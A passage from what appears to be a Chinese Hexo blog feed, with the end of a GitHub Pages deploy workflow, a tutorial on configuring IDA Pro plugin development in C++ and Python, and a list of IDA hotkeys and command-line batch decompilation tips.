&#125;&#125;-npm-cache</span><br><span class="line">          restore-keys: |</span><br><span class="line">            $&#123;&#123; runner.OS &#125;&#125;-npm-cache</span><br><span class="line">      - name: Install Dependencies</span><br><span class="line">        run: npm install</span><br><span class="line">      - name: Build</span><br><span class="line">        run: npm run build</span><br><span class="line">      - name: Deploy</span><br><span class="line">        uses: peaceiris/actions-gh-pages@v3</span><br><span class="line">        with:</span><br><span class="line">          github_token: $&#123;&#123; secrets.GITHUB_TOKEN &#125;&#125;</span><br><span class="line">          publish_dir: ./public</span><br></pre></td></tr></table></figure>

<p>前往 <a href="https://github.com/settings/tokens/new">https://github.com/settings/tokens/new</a> 申请一个 token，然后添加到项目的 前往 <code>Settings &gt; secrets &gt; actions</code> 添加一个变量 ACCESS_TOKEN ，然后将上面的 secrets.GITHUB_TOKEN 替换为 secrets.ACCESS_TOKEN 即可。</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://hexo-next.readthedocs.io/zh_CN/latest/">https://hexo-next.readthedocs.io/zh_CN/latest/</a></p>
<p><a href="https://hexo.io/zh-cn/docs/">https://hexo.io/zh-cn/docs/</a></p>
<p><a href="https://theme-next.js.org/">https://theme-next.js.org/</a></p>
]]></content>
      <categories>
        <category>web</category>
      </categories>
      <tags>
        <tag>博客</tag>
      </tags>
  </entry>
  <entry>
    <title>IDA 插件环境配置</title>
    <url>/2020/12/02/IDA-%E6%8F%92%E4%BB%B6%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/</url>
    <content><![CDATA[<blockquote>
<p>环境：vs2019,ida7.3</p>
</blockquote>
<h1 id="使用-VS-配置-IDA-C-插件环境"><a href="#使用-VS-配置-IDA-C-插件环境" class="headerlink" title="使用 VS 配置 IDA C++ 插件环境"></a>使用 VS 配置 IDA C++ 插件环境</h1><ol>
<li>使用 VS2019 新建一个 C++ 空工程，添加 C++ 文件 <code>myplugin.cpp</code> , 添加如下代码：<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ida.hpp&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;idp.hpp&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;loader.hpp&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;kernwin.hpp&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//以上是导入的SDK头文件</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> idaapi <span class="title">init</span><span class="params">(<span class="type">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">//IDA在启动的时候会调用每个插件的init函数。</span></span><br><span class="line">	<span class="comment">//返回值有三种选项:</span></span><br><span class="line">	<span class="comment">//PLUGIN_SKIP适合那些不支持的插件，IDA将不会加载该插件</span></span><br><span class="line">	<span class="comment">//PLUGIN_OK适合那些执行一次性功能的插件</span></span><br><span class="line">	<span class="comment">//PLUGIN_KEEP适合那些需要一直保持功能的插件</span></span><br><span class="line">	<span class="keyword">return</span> PLUGIN_OK;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> idaapi <span class="title">term</span><span class="params">(<span class="type">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">//当结束插件时，一般您可以在此添加一点任务清理的代码。</span></span><br><span class="line">	<span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> idaapi <span class="title">run</span><span class="params">(<span class="type">size_t</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">//当按下热键时候,执行功能的入口函数</span></span><br><span class="line">	<span class="built_in">warning</span>(<span class="string">&quot;Hello, world!&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">char</span> comment[] = <span class="string">&quot;It&#x27;s a plugin to show Hello world!&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">plugin_t</span> PLUGIN =</span><br><span class="line">&#123;</span><br><span class="line">  IDP_INTERFACE_VERSION,</span><br><span class="line">  <span class="number">0</span>,                    <span class="comment">// 插件的一些属性,一般为0即可</span></span><br><span class="line">  init,                 <span class="comment">// initialize</span></span><br><span class="line">  term,                 <span class="comment">// terminate. this pointer may be NULL.</span></span><br><span class="line">  run,                  <span class="comment">// invoke plugin</span></span><br><span class="line">  comment,              <span class="comment">// 插件的说明,会显示在IDA下方的状态栏中</span></span><br><span class="line">  <span class="string">&quot;&quot;</span>,                   <span class="comment">// multiline help about the plugin</span></span><br><span class="line">  <span class="string">&quot;Hello, world&quot;</span>,		<span class="comment">// 插件在列表中显示的名称</span></span><br><span class="line">  <span class="string">&quot;Alt-F1&quot;</span>              <span class="comment">// 插件想要注册的功能快捷键</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li>
<li>进入项目属性选项，进行如下配置</li>
</ol>
<p>配置属性 -&gt; 常规 -&gt; 配置类型： 选中 <strong>动态库(.dll)。</strong></p>
<img src="/2020/12/02/IDA-%E6%8F%92%E4%BB%B6%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/2020-12-02-16-46-38.png" class="">

<p>C&#x2F;C++ -&gt; 常规 -&gt; 附加包含目录：添加 IDASDK include 目录。</p>
<img src="/2020/12/02/IDA-%E6%8F%92%E4%BB%B6%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/2020-12-02-16-48-05.png" class="">

<p>C&#x2F;C++ -&gt; 常规 -&gt; 预处理器：添加 <code>__NT__</code></p>
<img src="/2020/12/02/IDA-%E6%8F%92%E4%BB%B6%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/2020-12-02-16-48-58.png" class="">

<p>C&#x2F;C++ -&gt; 代码生成 -&gt; 安全检查：修改为 <strong>禁用安全检查(&#x2F;GS-)</strong></p>
<img src="/2020/12/02/IDA-%E6%8F%92%E4%BB%B6%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/2020-12-02-16-50-30.png" class="">

<p>链接器 -&gt; 常规 -&gt;  附加包含目录：</p>
<ul>
<li>针对 <code>ida.exe</code> ，则添加 <code>idasdk\lib\x64_win_vc_32</code>。</li>
<li>针对 <code>ida64.exe</code> ，则添加 <code>idasdk\lib\x64_win_vc_64</code> 。</li>
</ul>
<img src="/2020/12/02/IDA-%E6%8F%92%E4%BB%B6%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/2020-12-02-16-55-47.png" class="">

<p>链接器 -&gt; 输入 -&gt; 附加依赖项：添加 <code>ida.lib</code> 。</p>
<img src="/2020/12/02/IDA-%E6%8F%92%E4%BB%B6%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/2020-12-02-16-58-08.png" class="">

<p>通过以上配置就完成了 IDA 插件环境配置。</p>
<h1 id="使用-CMAKE-配置-IDA-C-插件环境"><a href="#使用-CMAKE-配置-IDA-C-插件环境" class="headerlink" title="使用 CMAKE 配置 IDA C++ 插件环境"></a>使用 CMAKE 配置 IDA C++ 插件环境</h1><p>直接使用 <a href="https://github.com/Jinmo/ida-cmake">ida-cmake</a> 项目, 不过不同的编译环境需要修改相应的 gen 代码。下面为我修改适配 vs2109 的代码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_cmake_gen</span>(<span class="params">target_version, custom_gen</span>):</span><br><span class="line">    <span class="keyword">if</span> custom_gen:</span><br><span class="line">        <span class="keyword">return</span> custom_gen.strip()</span><br><span class="line">    <span class="keyword">if</span> os.name == <span class="string">&#x27;posix&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Unix Makefiles&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> os.name == <span class="string">&#x27;nt&#x27;</span>:</span><br><span class="line">        gen = <span class="string">&#x27;Visual Studio &#x27;</span> + (</span><br><span class="line">            <span class="string">&#x27;10&#x27;</span> <span class="keyword">if</span> target_version[<span class="number">0</span>] &lt;= <span class="number">6</span> <span class="keyword">and</span> target_version[<span class="number">1</span>] &lt;= <span class="number">8</span> <span class="keyword">else</span> <span class="string">&#x27;16&#x27;</span></span><br><span class="line">        )</span><br><span class="line">        <span class="keyword">return</span> (gen + <span class="string">&#x27; 2019&#x27;</span>) <span class="keyword">if</span> target_version &gt;= (<span class="number">7</span>, <span class="number">0</span>) <span class="keyword">else</span> gen</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">assert</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure>

<h1 id="使用-python-编写-IDA-插件"><a href="#使用-python-编写-IDA-插件" class="headerlink" title="使用 python 编写 IDA 插件"></a>使用 python 编写 IDA 插件</h1><p>vscode 使用相应的插件 <a href="https://github.com/ioncodes/idacode">idacode</a></p>
<p>pycharm 导入对应的文件夹既可高亮提示，如下图所示如何导入：</p>
<img src="/2020/12/02/IDA-%E6%8F%92%E4%BB%B6%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/2020-12-02-17-29-04.png" class="">


<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">UnknowClass</span>(idaapi.plugin_t):</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        给插件接口,实例的类定义</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    flags = idaapi.PLUGIN_KEEP  <span class="comment"># 插件的状态, 当前状态保持在Plugin菜单中</span></span><br><span class="line">    comment = <span class="string">&quot;XXX&quot;</span>             <span class="comment"># 描述信息</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">help</span> = <span class="string">&quot;&quot;</span>                   <span class="comment"># 帮助信息</span></span><br><span class="line">    wanted_name = <span class="string">&quot;XXX&quot;</span>         <span class="comment"># 菜单中显示的名字</span></span><br><span class="line">    <span class="comment">#wanted_hotkey = &quot;Ctrl+Alt+Shift+F12&quot;   # 希望注册的快捷键</span></span><br><span class="line">    wanted_hotkey = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#_PREFIX_NAME = &#x27;carveSelectedBytes&#x27;</span></span><br><span class="line">    <span class="comment">#_MIN_MAX_MATH_OPS_TO_ALLOW_RENAME = 11</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">	        初始化工作</span></span><br><span class="line"><span class="string">            构造基类,一般没什么实质操作, </span></span><br><span class="line"><span class="string">            记得给Super第一个参数更正为 当前类的名称</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">        <span class="built_in">super</span>(UnknowClass, self).__init__()</span><br><span class="line">        self._data = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">term</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">            Destory函数, 同析构函数, 留待释放资源</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">        </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">init</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">            进行初始化操作,可在此输出一些描述信息</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">        self.view = <span class="literal">None</span></span><br><span class="line">        <span class="comment"># self._cfg = None</span></span><br><span class="line">        <span class="comment"># print(&quot;=&quot; * 80)</span></span><br><span class="line">        <span class="comment"># print(&quot;carveSelectedBytes&quot;)</span></span><br><span class="line">        <span class="comment"># print(u&quot;保存所选的 HexData 到文件&quot;)</span></span><br><span class="line">        <span class="comment"># print(&quot;=&quot; * 80)</span></span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> idaapi.PLUGIN_OK</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">run</span>(<span class="params">self, arg</span>):</span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">            每次运行插件时, 执行的具体操作</span></span><br><span class="line"><span class="string">            功能代码在此编写</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">PLUGIN_ENTRY</span>():</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        插件入口,用于实例对象</span></span><br><span class="line"><span class="string">        返回的就是插件的功能等</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> carveSelectedBytes()</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>逆向</category>
      </categories>
      <tags>
        <tag>IDA</tag>
      </tags>
  </entry>
  <entry>
    <title>IDA使用技巧</title>
    <url>/2020/10/27/IDA%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/</url>
    <content><![CDATA[<h1 id="快捷键"><a href="#快捷键" class="headerlink" title="快捷键"></a>快捷键</h1><p>可以使用 IDA 菜单栏 <code>Options &gt; Shortcuts</code> 来查看、修改、添加快捷键。 </p>
<h2 id="文本输入框"><a href="#文本输入框" class="headerlink" title="文本输入框"></a>文本输入框</h2><p>使用 <code>Ctrl+Enter</code> 进行确认，使用 <code>ESC</code> 取消，使用 <code>F1</code> 查看帮助。使用所有的文本输入框，如注释、编辑本地类型等。</p>
<img src="/2020/10/27/IDA%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/2020-10-27-13-34-19.png" class="">

<h2 id="快速菜单导航"><a href="#快速菜单导航" class="headerlink" title="快速菜单导航"></a>快速菜单导航</h2><p>使用 <code>Alt</code> 键，可以在菜单项下看到下划线，同时按住带下划线的字母可以打开该菜单。可以通过 <code>cfg/idagui.cfg</code> 文件修改相应的加速键。</p>
<img src="/2020/10/27/IDA%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/2020-10-27-13-42-56.png" class="">

<h2 id="对话框"><a href="#对话框" class="headerlink" title="对话框"></a>对话框</h2><p><code>Tab</code> 键切换对话框上多个控件的焦点，使用 <code>Space</code> 键选中焦点对应的控件，也可以使用 <code>Alt</code> 键显示相关的加速键。</p>
<p>例如：快速退出 IDA 并丢弃自打开的数据库以来的所有修改，可以使用下列快捷键。</p>
<ul>
<li><code>Alt + F4</code> 退出IDA，将会显示保存数据库的对话框。</li>
<li><code>D</code> 选择 <code>DON’T SAVE the database</code> 复选框。</li>
<li><code>Enter</code> 或者 <code>Alt + K</code> 确认。</li>
</ul>
<img src="/2020/10/27/IDA%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/2020-10-27-13-53-34.png" class="">

<h2 id="命令面板"><a href="#命令面板" class="headerlink" title="命令面板"></a>命令面板</h2><p>使用 Ctrl + Shift + P 可以打开命令面板，可以在底部输入文本过滤相关操作。</p>
<img src="/2020/10/27/IDA%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/2020-10-27-14-08-36.png" class="">


<h2 id="选择"><a href="#选择" class="headerlink" title="选择"></a>选择</h2><p>按住 <code>Shift</code> 使用 光标导航键 <code>← ↑ → ↓</code> 。</p>
<p><code>Alt + L</code> 选择开始，然后导航到需要选择的末尾，执行相应的操作，最后 <code>Alt + L</code> 结束选择。</p>
<h2 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h2><p><code>Ctrl + PgUp</code> 转到数据库开头。</p>
<p><code>Ctrl + PgDn</code> 转到数据库开头。</p>
<p>选中按 <code>C</code> 将选中的数据转为代码。</p>
<p>选中按 <code>T</code> 转换为结构体偏移。</p>
<p>选中按 <code>A</code> 将选中的数据转为代码。</p>
<h2 id="高亮导航"><a href="#高亮导航" class="headerlink" title="高亮导航"></a>高亮导航</h2><p><code>Alt + Up</code> 或 <code>Alt + Down</code> 实现选中的高亮字符串之间前后跳转。</p>
<p><strong>IDA 7.5 新增功能</strong></p>
<p><code>Shift + Alt + Up</code> 查找定义（写入）所选寄存器的先前位置。<br><code>Shift + Alt + Down</code> 查找使用所选寄存器的下一个位置。</p>
<img src="/2020/10/27/IDA%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/2020-10-31-15-14-20.png" class="">

<p><strong>IDA 7.2 新增功能</strong></p>
<p><code>Ctrl + Shift + Up</code> &#x2F; <code>Ctrl + Shift + Down</code> 跳至上一个&#x2F;下一个函数的开头。</p>
<h1 id="IDA-命令行"><a href="#IDA-命令行" class="headerlink" title="IDA 命令行"></a>IDA 命令行</h1><h2 id="打开文件"><a href="#打开文件" class="headerlink" title="打开文件"></a>打开文件</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ida &lt;filename&gt;</span><br></pre></td></tr></table></figure>
<p><code>&lt;filename&gt;</code> 可以是您要反汇编的新文件或现有数据库。这种用法基本上与使用“文件”-&gt;“打开”或将文件拖放到IDA的图标上相同。您仍然需要手动确认“加载文件”对话框中的选项或IDA显示的任何其他提示，但是会跳过初始启动屏幕。</p>
<h3 id="自动选择Loader"><a href="#自动选择Loader" class="headerlink" title="自动选择Loader"></a>自动选择Loader</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ida -T&lt;prefix&gt; &lt;filename&gt;</span><br></pre></td></tr></table></figure>
<p>其中 <code>&lt;prefix&gt;</code> 是“加载文件”对话框中显示的加载器描述的唯一前缀。相关选项如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-TMicrosoft       Microsoft.Net程序集</span><br><span class="line">-TPortable        适用于AMD64（PE）的可移植可执行文件</span><br><span class="line">-TMS              MS-DOS可执行文件（EXE）</span><br><span class="line">-TBinary          二进制文件</span><br></pre></td></tr></table></figure>

<p>当 <code>&lt;prefix&gt;</code> 包含空格时，使用引号将  <code>&lt;prefix&gt;</code> 包起来。For example, to load the first slice from a fat Mach-O file:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ida &quot;-TFat Mach-O File, 1&quot; file.macho</span><br></pre></td></tr></table></figure>

<p>如果是 ZIP 格式的归档文件，则可以指定要在冒号后装入的归档成员。要从 apk 中加载主dex文件:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ida -TZIP:classes.dex:Android file.apk</span><br></pre></td></tr></table></figure>

<p>但是，通常最好在顶层选择APK加载程序</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ida -TAPK file.apk</span><br></pre></td></tr></table></figure>

<p>当-T指定时，将跳过初始加载对话框，并且IDA会直接使用指定的加载器直接加载文件。</p>
<h3 id="使用默认模式打开文件"><a href="#使用默认模式打开文件" class="headerlink" title="使用默认模式打开文件"></a>使用默认模式打开文件</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ida -A &lt;filename&gt;</span><br></pre></td></tr></table></figure>
<p>这将使用自主模式或批处理模式加载文件，其中IDA将不显示任何对话框，但在所有情况下均接受默认答案。</p>
<blockquote>
<p>在此模式下，加载完成后将不会显示任何交互式对话框。要恢复交互性，请 <code>batch(0)</code> 在 IDA 窗口底部的 IDC 或 Python 控制台中执行语句。</p>
</blockquote>
<h3 id="批量反汇编"><a href="#批量反汇编" class="headerlink" title="批量反汇编"></a>批量反汇编</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ida -B &lt;filename&gt;</span><br></pre></td></tr></table></figure>
<p>IDA 将使用所有默认选项加载文件，等待自动分析结束，将反汇编输出到 <code>&lt;filename&gt;.asm</code> 并在保存数据库后退出。</p>
<h3 id="二进制文件选项"><a href="#二进制文件选项" class="headerlink" title="二进制文件选项"></a>二进制文件选项</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ida -p&lt;processor&gt; -B&lt;base&gt; &lt;filename&gt;</span><br></pre></td></tr></table></figure>
<ul>
<li><code>&lt;processor&gt;</code> 是IDA支持的处理器类型之一。</li>
<li><code>&lt;base&gt;</code> 是加载基址(16进制)。</li>
</ul>
<p>例如，要在线性地址 <code>0xBFC00000</code> 上加载大端 <code>MIPS</code> 固件：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ida -pmipsb -bBFC0000 firmware.bin</span><br></pre></td></tr></table></figure>

<p>映射到 <code>0x4000</code> 的 <code>Cortex-M3</code> 固件：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ida -parm:ARMv7-M -b400 firmware.bin</span><br></pre></td></tr></table></figure>

<h3 id="打印log"><a href="#打印log" class="headerlink" title="打印log"></a>打印log</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ida -B -Lida_batch.log &lt;filename&gt;</span><br></pre></td></tr></table></figure>
<p>打开 log 输出信息。</p>
<h2 id="批量反编译"><a href="#批量反编译" class="headerlink" title="批量反编译"></a>批量反编译</h2><p>反编译整个文件：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ida -Ohexrays:outfile.c:ALL -A &lt;filename&gt;</span><br></pre></td></tr></table></figure>

<p>反编译 main 函数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ida -Ohexrays:outfile.c:main -A &lt;filename&gt;</span><br></pre></td></tr></table></figure>
<h3 id="定制批量反编译"><a href="#定制批量反编译" class="headerlink" title="定制批量反编译"></a>定制批量反编译</h3><p>Python脚本可与该 <code>-S</code> 开关一起使用，以在文件加载后自动运行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ida -A -Sdecompile_entry_points.py -Llogfile.txt &lt;filename&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> print_function</span><br><span class="line"></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># This example tries to load a decompiler plugin corresponding to the current</span></span><br><span class="line"><span class="comment"># architecture (and address size) right after auto-analysis is performed,</span></span><br><span class="line"><span class="comment"># and then tries to decompile the function at the first entrypoint.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># It is particularly suited for use with the &#x27;-S&#x27; flag, for example:</span></span><br><span class="line"><span class="comment"># idat -Ldecompile.log -Sdecompile_entry_points.py -c file</span></span><br><span class="line"><span class="comment"># filename: Sdecompile_entry_points.py</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> ida_ida</span><br><span class="line"><span class="keyword">import</span> ida_auto</span><br><span class="line"><span class="keyword">import</span> ida_loader</span><br><span class="line"><span class="keyword">import</span> ida_hexrays</span><br><span class="line"><span class="keyword">import</span> ida_idp</span><br><span class="line"><span class="keyword">import</span> ida_entry</span><br><span class="line"></span><br><span class="line"><span class="comment"># becsause the -S script runs very early, we need to load the decompiler</span></span><br><span class="line"><span class="comment"># manually if we want to use it</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">init_hexrays</span>():</span><br><span class="line">    ALL_DECOMPILERS = &#123;</span><br><span class="line">        ida_idp.PLFM_386: <span class="string">&quot;hexrays&quot;</span>,</span><br><span class="line">        ida_idp.PLFM_ARM: <span class="string">&quot;hexarm&quot;</span>,</span><br><span class="line">        ida_idp.PLFM_PPC: <span class="string">&quot;hexppc&quot;</span>,</span><br><span class="line">        ida_idp.PLFM_MIPS: <span class="string">&quot;hexmips&quot;</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    cpu = ida_idp.ph.<span class="built_in">id</span></span><br><span class="line">    decompiler = ALL_DECOMPILERS.get(cpu, <span class="literal">None</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> decompiler:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;No known decompilers for architecture with ID: %d&quot;</span> % ida_idp.ph.<span class="built_in">id</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">if</span> ida_ida.inf_is_64bit():</span><br><span class="line">        <span class="keyword">if</span> cpu == ida_idp.PLFM_386:</span><br><span class="line">            decompiler = <span class="string">&quot;hexx64&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            decompiler += <span class="string">&quot;64&quot;</span></span><br><span class="line">    <span class="keyword">if</span> ida_loader.load_plugin(decompiler) <span class="keyword">and</span> ida_hexrays.init_hexrays_plugin():</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Couldn\&#x27;t load or initialize decompiler: &quot;%s&quot;&#x27;</span> % decompiler)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decompile_func</span>(<span class="params">ea, outfile</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Decompiling at: %X...&quot;</span> % ea)</span><br><span class="line">    cf = ida_hexrays.decompile(ea)</span><br><span class="line">    <span class="keyword">if</span> cf:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;OK.&quot;</span>)</span><br><span class="line">        outfile.write(<span class="built_in">str</span>(cf) + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;failed!&quot;</span>)</span><br><span class="line">        outfile.write(<span class="string">&quot;decompilation failure at %X!\n&quot;</span> % ea)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Waiting for autoanalysis...&quot;</span>)</span><br><span class="line">    ida_auto.auto_wait()</span><br><span class="line">    <span class="keyword">if</span> init_hexrays():</span><br><span class="line">        eqty = ida_entry.get_entry_qty()</span><br><span class="line">        <span class="keyword">if</span> eqty:</span><br><span class="line">            idbpath = idc.get_idb_path()</span><br><span class="line">            cpath = idbpath[:-<span class="number">4</span>] + <span class="string">&quot;.c&quot;</span></span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(cpath, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> outfile:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;writing results to &#x27;%s&#x27;...&quot;</span> % cpath)</span><br><span class="line">                <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(eqty):</span><br><span class="line">                    ea = ida_entry.get_entry(ida_entry.get_entry_ordinal(i))</span><br><span class="line">                    decompile_func(ea, outfile)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;No known entrypoint. Cannot decompile.&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> idaapi.cvar.batch:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;All done, exiting.&quot;</span>)</span><br><span class="line">        ida_pro.qexit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">main()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="加快批处理速度"><a href="#加快批处理速度" class="headerlink" title="加快批处理速度"></a>加快批处理速度</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">TVHEADLESS=1 idat -A -Smyscript.idc file.bin &gt;/dev/null &amp;</span><br></pre></td></tr></table></figure>
<p>idat使用轻量级文本模式UI的文本模式可执行文件，不需要初始化初始化所有依赖的UI库，可以使用命令行参数在后台运行。</p>
<h1 id="重新分析"><a href="#重新分析" class="headerlink" title="重新分析"></a>重新分析</h1><h2 id="重新分析指令"><a href="#重新分析指令" class="headerlink" title="重新分析指令"></a>重新分析指令</h2><p>将鼠标放在需要重新分析的指令上，然后按 <code>C</code> 键转换为代码。</p>
<h2 id="重新分析函数"><a href="#重新分析函数" class="headerlink" title="重新分析函数"></a>重新分析函数</h2><p>使用 Alt + P 键编辑函数。</p>
<h2 id="选中范围分析"><a href="#选中范围分析" class="headerlink" title="选中范围分析"></a>选中范围分析</h2><p>按 Alt + L 选中开始，转到选择的结尾，按 <code>C</code> 键转换为代码。</p>
<h2 id="重新分析整个数据库"><a href="#重新分析整个数据库" class="headerlink" title="重新分析整个数据库"></a>重新分析整个数据库</h2><ol>
<li>Menu Options &gt;  General…, Analysis Tab, Reanalyze program button;</li>
</ol>
<img src="/2020/10/27/IDA%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/2020-10-31-16-44-25.png" class="">

<ol start="2">
<li>右键单击IDA窗口底部的状态栏，Reanalyze program .</li>
</ol>
<img src="/2020/10/27/IDA%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/2020-10-31-16-45-30.png" class="">

<h1 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h1><h2 id="创建数组"><a href="#创建数组" class="headerlink" title="创建数组"></a>创建数组</h2><p>使用 右键菜单-&gt; Array… 创建一个数据，或者按 <code>*</code> 键创建数组。</p>
